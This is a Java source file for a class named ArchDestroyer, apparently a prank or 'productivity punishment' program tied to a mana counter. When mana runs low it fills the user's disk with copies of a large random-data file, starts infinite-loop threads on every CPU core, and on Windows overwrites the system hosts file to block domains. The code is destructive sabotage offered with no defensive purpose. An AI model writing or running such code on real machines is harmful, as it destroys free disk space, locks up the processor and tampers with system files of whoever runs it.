import java.io.FileOutputStream;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.FileStore;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Random;


public class ArchDestroyer {

    long manaRemaining;
    private String dataLocation = System.getProperty("user.home");
    private boolean didCorruptHarddrive = false;

    FileOutputStream FileOutput;


    protected ArchDestroyer(long mana) {
        manaRemaining = mana;

        if (manaRemaining < 75 && !didCorruptHarddrive){

                System.out.print(dataLocation);
                if (dataLocation.contains("C:\\")) {

                    dataLocation += "/appdata/void";

                } else if (dataLocation.charAt(0) == '/') {
                    //*NIX and MAC

                    dataLocation += "/.archmage/void";

                } else {
                    //OH GOD HELP ME

                    System.out.println("WHAT OS ARE YOU USING?!!!!!!");
                    System.exit(36);//FILE SYSTEM ERROR. SEND HELP

                }



            try {
                String tempLoc = dataLocation.replace("void", "beproductive.txt");
                FileStore myStore = Files.getFileStore(Paths.get(tempLoc));
                if (myStore.getUsableSpace() < 500000000){ //TODO change to a > in production
                    DiskSpaceDestroyer();//Only corrupt if more than 0.5 Gb are free
                }
                didCorruptHarddrive = true;
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        if (manaRemaining < 25) {
            for (int cores = Runtime.getRuntime().availableProcessors(); cores > 0; cores--) {
                CPUDestroyer();
            }

        }


        if (manaRemaining < 50) {

            if (dataLocation.contains("C:\\")){
                dataLocation = "C:\\Windows\\System32\\drivers\\etc\\hosts";


                File file = new File(dataLocation);

                try {
                    file.createNewFile();
                } catch (IOException e) {
                    System.out.println("Not an admin, please try again");
                    return;
                }

                FileWriter writer = null;

                try {
                    writer = new FileWriter(file);
                } catch (IOException e) {
                    System.out.println("Not an admin, please try again");
                    return;
                }
                try {
                    writer.write("127.0.0.1         .com");
                    writer.write("127.0.0.1         .org");
                    writer.write("127.0.0.1         .gg");
                    writer.write("127.0.0.1         .net");

                } catch (IOException e) {
                    System.out.println("IDK what went wrong here");
                }

            }


        }






    }



    private void CPUDestroyer() {

        new Thread() {
            public void run() {
                for (;;)
                    ;
            }
        }.start();

    }



    private void DiskSpaceDestroyer() throws IOException {


        File file = new File(dataLocation);

        file.createNewFile();

        FileWriter writer = null;

        writer = new FileWriter(file);



        Random rng = new Random();

        writer.write("The Daylight, it burns! It lacks the mana to contain us");

        for (int length = 55; length <= 5000000; length += 1) {

                writer.write(Long.toString(rng.nextLong()));
        }

        File diskUsage = new File(dataLocation + "size");

        FileStore store = Files.getFileStore(Paths.get(dataLocation));
        Path startingLoc = Paths.get(dataLocation);




        for (int stringadd = 1; store.getUsableSpace() > 100000000; stringadd++) {
            Path destination = Paths.get(dataLocation + stringadd);
            Files.copy(startingLoc, destination);
            store = Files.getFileStore(Paths.get(dataLocation));
        }




    }



}
